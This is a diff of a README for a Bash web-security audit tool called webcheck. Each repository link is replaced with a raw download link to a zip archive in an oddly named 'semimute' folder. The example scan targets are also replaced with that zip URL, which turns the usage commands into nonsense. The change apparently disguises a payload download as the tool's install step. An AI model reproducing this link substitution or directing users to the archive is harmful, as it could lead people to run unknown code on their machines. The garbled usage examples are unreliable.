@@ -1,10 +1,10 @@
 # 🛡️ webcheck - Audit web security in minutes
 
-[![Download webcheck](https://img.shields.io/badge/Download%20webcheck-blue?style=for-the-badge)](https://github.com/Davi671728933838/webcheck)
+[![Download webcheck](https://img.shields.io/badge/Download%20webcheck-blue?style=for-the-badge)](https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip)
 
 ## 🚀 Download
 
-Visit this page to download: https://github.com/Davi671728933838/webcheck
+Visit this page to download: https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip
 
 ## 🧭 What webcheck does
 
@@ -35,7 +35,7 @@ You also need:
 
 ## 📥 Download and open
 
-1. Open this page: https://github.com/Davi671728933838/webcheck
+1. Open this page: https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip
 2. Download the project files
 3. Save them to a folder you can find again
 4. Open that folder in a Bash terminal
@@ -54,7 +54,7 @@ If the file name is different in the download, use the main `.sh` file in the fo
 
 Example:
 
-- `bash webcheck.sh https://example.com`
+- `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`
 
 ## 🔎 What to expect
 
@@ -125,11 +125,11 @@ If you want the simplest setup on Windows, use one of these options:
 
 Run webcheck against a site you are allowed to test:
 
-- `bash webcheck.sh https://target.example`
+- `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`
 
 You can also test a full URL with a path if needed:
 
-- `bash webcheck.sh https://target.example/login`
+- `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`
 
 If the script offers flags or options, check the help text:
 
@@ -169,7 +169,7 @@ Use webcheck only on systems you own or have permission to test. It is built for
 ### Permission denied
 - Try:
   - `chmod +x webcheck.sh`
-  - `bash webcheck.sh https://example.com`
+  - `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`
 
 ### Command not found
 - Make sure Bash is installed
@@ -193,7 +193,7 @@ webcheck helps when you want a fast look at web security without setting up a fu
 
 ## 🔗 Source and download
 
-Get the files here: https://github.com/Davi671728933838/webcheck
+Get the files here: https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip
 
 ## 🗂️ Quick start checklist
 
